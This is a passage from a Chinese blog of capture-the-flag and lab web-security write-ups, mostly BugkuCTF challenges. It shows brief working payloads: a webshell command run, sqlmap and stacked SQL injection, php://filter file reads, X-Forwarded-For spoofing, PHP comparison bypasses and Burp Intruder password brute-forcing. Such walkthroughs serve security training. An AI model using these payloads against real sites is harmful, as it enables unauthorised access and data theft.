<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152556277.png" alt="image-20200715152556277"></p>
<p>cat 一下这个路径，可以看到在config这个文件里有一个一句话木马，我们来对他进行一个访问，看看能否执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715152629952.png" alt="image-20200715152629952"></p>
<p>在url中传输一个d执行linux命令，然后在PSOT传入b执行ls查看当前路径下的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153011666.png" alt="image-20200715153011666"></p>
<h4 id="逻辑漏洞之验证码不失效"><a href="#逻辑漏洞之验证码不失效" class="headerlink" title="逻辑漏洞之验证码不失效"></a>逻辑漏洞之验证码不失效</h4><p>页面是先验证验证码是否正确，在验证账号密码</p>
<p>当验证码输入错误的时候</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153553499.png" alt="image-20200715153553499"></p>
<p>可以当验证码输入正确时返回输入密码不正确，4秒返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153715522.png" alt="image-20200715153715522"></p>
<p>在这4秒内自己后退返回，他的验证码是不变的，这样就可以再次使用这个验证码来进行验证，所以这里就可以使用bp来进行抓包，然后发送到Repeater模块进行测试，这个期间因为是抓包所以页面是不动的，这也就导致了验证码不刷新</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715153933440.png" alt="image-20200715153933440"></p>
<p>因为我们之前测试知道了用户名处存在sql注入，在这里将用户名后面改为aaa*这里的 * 表示所有，然后选中所有，另存为txt文本使用sqlmap记性自动注入</p>
<p><code>sqlmap -r 文件名 --dbs</code>这样就注入出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715154320109.png" alt="image-20200715154320109"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-bugku" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/bugku/" class="article-date">
  	<time datetime="2020-07-25T01:16:39.632Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/bugku/">
        bugku
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="MD5解密"><a href="#MD5解密" class="headerlink" title="MD5解密"></a>MD5解密</h4><p>复制TVRjMU9UYz0=</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211239471.png" alt="image-20200414211239471"></p>
<p>进行MD5解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211307516.png" alt="image-20200414211307516"></p>
<p>复制MTc1OTc=再次进行解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211328587.png" alt="image-20200414211328587"></p>
<p>复制这5位数，填入输入框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211353175.png" alt="image-20200414211353175"></p>
<h4 id="输入长度限制"><a href="#输入长度限制" class="headerlink" title="输入长度限制"></a>输入长度限制</h4><p>只能输入一个字符</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211642975.png" alt="image-20200414211642975"></p>
<p>F12查看，发现maxlength限制长度1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/ca7bdff30672b9b087f28cc4762e102dfbe34616/image-20200414211503349.png" alt="image-20200414211503349"></p>
<p>更改长度，输入大于1778的数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211711691.png" alt="image-20200414211711691"></p>
<p>进行验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211718742.png" alt="image-20200414211718742"></p>
<h4 id="绕过第一个if判断"><a href="#绕过第一个if判断" class="headerlink" title="绕过第一个if判断"></a>绕过第一个if判断</h4><p>查看代码，发现第二个if必须是输入的数字是1才能执行echo输出flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211858576.png" alt="image-20200414211858576"></p>
<p>输入?num=1，页面没有响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211922567.png" alt="image-20200414211922567"></p>
<p>发现第一个if是!is_numeric，所以输入带上字符的1，比如1”等等</p>
<p>这样就成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212023379.png" alt="image-20200414212023379"></p>
<p>解释：因为输入1”第一个if判断不是数字，不执行echo $num，代码向下走，在进行if判断，这里的if判断1”在程序运行时这里的判断不管1后面有没有字符都会当做1来执行，所以成功输出flag</p>
<h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p>payloa：?key=keykeykeykeykeykeykey:///keyx”:i</p>
<p>查看代码</p>
<p>发现正则，然后进行匹配</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212253676.png" alt="image-20200414212253676"></p>
<p>/key                        代表一个key</p>
<p>.*                            代表一个或多个</p>
<p>.                              代表一个</p>
<p>{4,7}                       代表最少4个最多起个</p>
<p>key                         一个</p>
<p>/./                        转义中间的.代表一个///</p>
<p>.*key                      一个或者多个</p>
<p>[a-z]                       a-z中任意一个字母</p>
<p>[[:punct:]]             任意一个英文字符</p>
<p>/i                             一个i</p>
<p>得出结果输入，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212821929.png" alt="image-20200414212821929"></p>
<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>Payload：?number1[]=1&amp;number2[]=2</p>
<p>查看代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414213304545.png" alt="image-20200414213304545"></p>
<p>进行分析代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/V4F8M65%7D%7B%7D%7DAW%60MZI1%7BML0L.png" alt="img"></p>
<p>需要让第一个判断错误，然后进行下一个判断，md5不能加密数组，所以这里要传一个空数组</p>
<p>输入上面的Payload，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414213758327.png" alt="image-20200414213758327"></p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>查看原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140146112.png" alt="image-20200512140146112"></p>
<p>在POST框输入1查看返回什么内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140315871.png" alt="image-20200512140315871"></p>
<p>使用show database查看所有数据库</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140744730.png" alt="image-20200512140744730"></p>
<p>查看一下表试一下，返回了，Flag表，发现存在堆叠注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140828405.png" alt="image-20200512140828405"></p>
<p>查看PHP代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512141555352.png" alt="image-20200512141555352"></p>
<p>可以看到上面的提交语句是这样的这是一种非预期解的方法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select &quot;.$post[‘query‘].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>当我们输入1后进行拼接后的语句就是这样的了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>

<p>预期解通过堆叠注入将sql_mode的值设置为PIPES_AS_CONCAT，从而将 || 视为字符串的连接操作符而非或运算符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>

<p>将||或运算变成连接符后就得到了一下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1,flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>查看原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105117391.png" alt="image-20200522105117391"></p>
<p>使用admin和admin尝试进行登录。</p>
<p>返回错误，说用户名和密码不存在。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105325431.png" alt="image-20200522105325431"></p>
<p>这样一个一个的尝试效率太慢了，我们使用burpsuit进行抓包</p>
<p>先随机输入密码，进行抓包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105627840.png" alt="image-20200522105627840"></p>
<p>将信息发送到intruder模块进行clear$，然后选中password中的值将其Add$</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105936280.png" alt="image-20200522105936280"></p>
<p>进入Payload子模块，进行载入字典爆破。</p>
<p>查看字典中的弱口令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110046142.png" alt="image-20200522110046142"></p>
<p>在Plyload Options [Simple list]中的load…选中password字典</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110202979.png" alt="image-20200522110202979"></p>
<p>进行Start attack发动攻击</p>
<p>得出密码是123456</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110311453.png" alt="image-20200522110311453"></p>
<p>在页面中输入这个密码，查看是否能够登陆成功</p>
<p>登陆成功。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110356569.png" alt="image-20200522110356569"></p>
<h4 id="暴力破解验证码绕过"><a href="#暴力破解验证码绕过" class="headerlink" title="暴力破解验证码绕过"></a>暴力破解验证码绕过</h4><p>原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110910188.png" alt="image-20200522110910188"></p>
<p>进行一次登陆试试上面已经知道密码是123456了所以我们现在假装不知道进行绕过</p>
<p>这里我们输入的是admin，admin</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110953883.png" alt="image-20200522110953883"></p>
<p>我们进行抓包，将包发送到Repeater模块进行尝试登陆</p>
<p>点击Go，得到源码，然后右键选中browser，复制网页地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522111258822.png" alt="image-20200522111258822"></p>
<p>Copy之后在网页打开试试</p>
<p>显示登陆失败，验证码也变化了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522111439333.png" alt="image-20200522111439333"></p>
<p>我们将Repeater中得包信息发送到Intruder模块</p>
<p>将验证码改为当前页面的正确验证码，将字典中的弱口令导入，发动攻击</p>
<p>得出密码：123456</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522112112995.png" alt="image-20200522112112995"></p>
<p>在页面中使用改密码登录</p>
<p>登陆成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522112156596.png" alt="image-20200522112156596"></p>
<h4 id="绕过前端验证暴力破解"><a href="#绕过前端验证暴力破解" class="headerlink" title="绕过前端验证暴力破解"></a>绕过前端验证暴力破解</h4><p>还是使用admin和123登录，然后进行抓包，使用弱口令进行爆破</p>
<p>得出123456密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135328846.png" alt="image-20200522135328846"></p>
<p>如果我们将抓包里面的验证码更改一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135409179.png" alt="image-20200522135409179"></p>
<p>进行发动攻击，还是出来了，说明验证码只是进行了前端验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135431754.png" alt="image-20200522135431754"></p>
<p>在页面中使用密码登录或者在burp中复制然后打开</p>
<p>登陆成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135839104.png" alt="image-20200522135839104"></p>
<h3 id="BugkuCTF"><a href="#BugkuCTF" class="headerlink" title="BugkuCTF"></a>BugkuCTF</h3><h4 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212712340.png" alt="image-20200525212712340"></p>
<p>打开地址查看页面</p>
<p>页面只有表情，没有任何东西</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212754995.png" alt="image-20200525212754995"></p>
<p>按F12查看一下源代码</p>
<p>发现源代码将flag注释了，我们复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212841039.png" alt="image-20200525212841039"></p>
<h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212936523.png" alt="image-20200525212936523"></p>
<p>原页面，发现有公式输入框，按照将加法的结果写进去试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212952887.png" alt="image-20200525212952887"></p>
<p>74+14=88，发现只能输入一个数字，说明进行了字符长度限制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213101428.png" alt="image-20200525213101428"></p>
<p>F12查看代码，可以看到这里做了字符长度限制，只能输入一个字符。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213152555.png" alt="image-20200525213152555"></p>
<p>将1改为多位数，再次输入正确数值88</p>
<p>成功显示flag，复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213255863.png" alt="image-20200525213255863"></p>
<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214312273.png" alt="image-20200525214312273"></p>
<p>打开网址，查看页面</p>
<p>可以看到GET输入，当$what=flag输出flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214423931.png" alt="image-20200525214423931"></p>
<p>我们在URL中输入flag，复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214724268.png" alt="image-20200525214724268"></p>
<h4 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525220028996.png" alt="image-20200525220028996"></p>
<p>查看页面，可以看到是Post提交，提交方式和Get一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525221924026.png" alt="image-20200525221924026"></p>
<p>在POST中提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222017722.png" alt="image-20200525222017722"></p>
<h4 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222601214.png" alt="image-20200525222601214"></p>
<p>查看页面</p>
<p>可以看到只要是不是数字，而且等于1就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222621231.png" alt="image-20200525222621231"></p>
<p>这里不管1后面加什么都以，但不能在1的前面加。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223421384.png" alt="image-20200525223421384"></p>
<h4 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223849175.png" alt="image-20200525223849175"></p>
<p>查看页面，发现一直返回这两个弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223928618.png" alt="image-20200525223928618"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223935748.png" alt="image-20200525223935748"></p>
<p>按F12 查看源码</p>
<p>发现一串HTML代码，复制进行解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225228761.png" alt="image-20200525225228761"></p>
<p>解码之后得到Key值，复制直接提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225258621.png" alt="image-20200525225258621"></p>
<h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>这里就是要配置host配置文件，将flag.baidu.com 解析到123.206.87.240然后在网页中访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225744153.png" alt="image-20200525225744153"></p>
<p>修改hosts文件，路径为<code>C:\Windows\System32\drivers\etc\hosts</code>最底下添加：120.24.86.145     flag.bugku.com  保存 访问即可</p>
<p>在页面中打开</p>
<p>成功获取key值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525231435886.png" alt="image-20200525231435886"></p>
<p>还有一种方法就是使用burp抓包添加HOST请求</p>
<p>直接复制提交就ok，这两种方法都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525231559549.png" alt="image-20200525231559549"></p>
<h4 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526075950924.png" alt="image-20200526075950924">查看</p>
<p>查看原始页面。这是我已经刷新好几次抓到的，刚进去可能没有图片，页面会一直刷新</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080029978.png" alt="image-20200526080029978"></p>
<p>因为一直刷新所以源码也跟着刷新，根本没机会，所以就可以使用burp进行抓包。</p>
<p>让页面随机运行一次然后抓包。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080213462.png" alt="image-20200526080213462"></p>
<p>抓完包发送到Repeater模块中，点击Go一直点击，直到出来flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080417167.png" alt="image-20200526080417167"></p>
<p>或者按F12，然后将burp放旁边只要一出现flag立马打开Intercept is on进行抓包，让页面停止运行，这一种看你反应。</p>
<p>复制flag提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080550190.png" alt="image-20200526080550190"></p>
<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192157745.png" alt="image-20200607192157745"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192302988.png" alt="image-20200607192302988"></p>
<p>有好几种方法</p>
<p>在POST区域：<code>f=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>php://filter/convert.base64-encode/rescoure=flag.php</p>
<p>会获得base64的加密内容，复制进行解密就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192441288.png" alt="image-20200607192441288"></p>
<p>还有一种方法直接将flag.php文件读入变量hello中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?hello&#x3D;get_file_contents(&#39;flag.php&#39;) </span><br><span class="line">?hello&#x3D;file(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192631186.png" alt="image-20200607192631186"></p>
<h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526084005998.png" alt="image-20200526084005998"></p>
<p>打开页面得到以下代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526084032873.png" alt="image-20200526084032873"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))		&#x2F;&#x2F;  &#x2F;^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$&#x2F;结尾</span><br><span class="line">    &#123;		</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);		&#x2F;&#x2F;var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计，这里需要知道一个知识点<code>可变变量</code></p>
<p>可变变量是一种独特的变量，它允许动态改变一个变量名称。其原理是变量的名称由另外一个变量的值来确定，即一个可变变量获取了一个普通变量的值作为这个可变变量的变量名，实现过程是在变量前面多加美元符号 “$”</p>
<p>我们的目标是得到flag，由于代码含有正则匹配，文件上传、本地包含等漏洞不能用，而PHP中$GLOBALS[index] 的数组中存储了所有全局变量</p>
<p>复制提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526083941332.png" alt="image-20200526083941332"></p>
<h4 id="web-5"><a href="#web-5" class="headerlink" title="web 5"></a>web 5</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085709523.png" alt="image-20200526085709523"></p>
<p>原始页面，随便提交以下数字试试，发现不行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085758424.png" alt="image-20200526085758424"></p>
<p>查看一下源码，发现有一大堆这种JSFUCK代码，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085828992.png" alt="image-20200526085828992"></p>
<p>复制这些代码，放到控制台中执行，不要忘记复制上去按回车</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090504610.png" alt="image-20200526090504610"></p>
<p>记住字母要大写，这里给你显示的小写字母，要将字母转换为大写，在你打开前输入flag的地方已经提示了，字母要大写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090605804.png" alt="image-20200526090605804"></p>
<p>返回正常，说明正确，复制这个大写字母的flag在BugkuCFT提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090750250.png" alt="image-20200526090750250"></p>
<h4 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091427466.png" alt="image-20200526091427466"></p>
<p>原始页面，发现真的是什么也没有</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091547653.png" alt="image-20200526091547653"></p>
<p>使用burp抓一下包试试，发送到Repeater，发现flag在请求头中，复制提交。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091710745.png" alt="image-20200526091710745"></p>
<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092405600.png" alt="image-20200526092405600"></p>
<p>原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092432701.png" alt="image-20200526092432701"></p>
<p>进去之后没什么特别的提示</p>
<p>但题目说了 实战 经常遇到 </p>
<p>所以 直接 御剑 跑一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092618994.png" alt="image-20200526092618994"></p>
<p>点击上面的shell.php，会进入一个后台界面，让我们输入密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092646058.png" alt="image-20200526092646058"></p>
<p>可是我们并不知道密码是多少，所以使用暴力破解，如果一个一个的去试太麻烦了，而且想到的数量太少了，所以使用burp进行抓包。</p>
<p>现在输入框中随机输入内容，这里我输入的是123，然后打开burp点击网页的登录，进行抓包，不要忘记将Intercept is on打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092921318.png" alt="image-20200526092921318"></p>
<p>右键，将其发送到intruder模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092943621.png" alt="image-20200526092943621"></p>
<p>现将123 Clear$掉，然后选中123再Add$一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093025865.png" alt="image-20200526093025865"></p>
<p>单击Payloads子模块</p>
<p>选中burp自带的字典，Add from list…选中Passwords，点击Start attack，进行爆破密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093244488.png" alt="image-20200526093244488"></p>
<p>爆破完成后，可以看到密码是hack</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093359014.png" alt="image-20200526093359014"></p>
<p>在页面提交hack，成功返回flag，复制flag提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093420784.png" alt="image-20200526093420784"></p>
<h4 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095051329.png" alt="image-20200526095051329"></p>
<p>原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095115923.png" alt="image-20200526095115923"></p>
<p>查看源代码，可以看到有一个base64加密的密文，解密之后得到test123</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095133950.png" alt="image-20200526095133950"></p>
<p>因为i管理员系统，账号肯定是admin，密码已经解密出来了是test123</p>
<p>输入提交，发现并没有返回对应的flag，而是说IP禁止访问，请联系<strong>本地</strong>管理员登录，IP被记录，这说明需要<strong>伪造本地IP</strong>进行访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095240198.png" alt="image-20200526095240198"></p>
<p>先输入账号密码，，然后使用burp抓包发送到Repeater模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095410043.png" alt="image-20200526095410043"></p>
<p>加入<code>X-Forwarded-For:127.0.0.1</code>伪造IP，点击GO成功返回flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095817142.png" alt="image-20200526095817142"></p>
<h4 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h4><p>打开网址，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100105719.png" alt="image-20200526100105719"></p>
<p>题目提醒了要查看源代码，可以看到好多URL编码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100138637.png" alt="image-20200526100138637"></p>
<p>先复制p1 和 p2的url，将没用的删去</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100343484.png" alt="image-20200526100343484"></p>
<p>这里可以看到unescape中的url编码在p1和p2之间，所以将他里面的url放中间，先将p1，p2分隔开防止弄乱，再加入unescape中的url，这里面的单引号全都要删除，还有分号什么的，只要与url编码无关的全都删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100545399.png" alt="image-20200526100545399"></p>
<p>将多余的空格删除，然后进行解码得到flag，提交，提交时候要加上flag{}将值放到花括号中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100735818.png" alt="image-20200526100735818"></p>
<h4 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104118080.png" alt="image-20200526104118080"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104928268.png" alt="image-20200526104928268"></p>
<p>点进click me？no看看，可以看到 test5是show.php中的信息，结合题目给的信息说flag在index中也就是index.php中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104959071.png" alt="image-20200526104959071"></p>
<p>构造任意读取文件的payload：<code>php://filter/read=convert.base64-encode/resource=index.php</code>。</p>
<p>后面还有很多，复制进行base64解码，将没用的删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526105646487.png" alt="image-20200526105646487"></p>
<p><code>php://filter</code>使我们常用的一种伪协议在任意文件读取，甚至getshell的时候都有利用的机会。这里就是用的任意读取文件</p>
<p><code>read=&lt;读链的筛选列表&gt;</code>           该参数可选。可以设定一个或多个过滤器名称</p>
<p>这里读的过滤器为<code>convert.base64-encode</code>，就和字面上的意思一样，把输入流<code>base64-encode</code>。<br><code>resource=index.php</code>，代表读取index.php的内容</p>
<p>关于<code>convert.*</code>过滤器，可以访问一下网址有详细讲解</p>
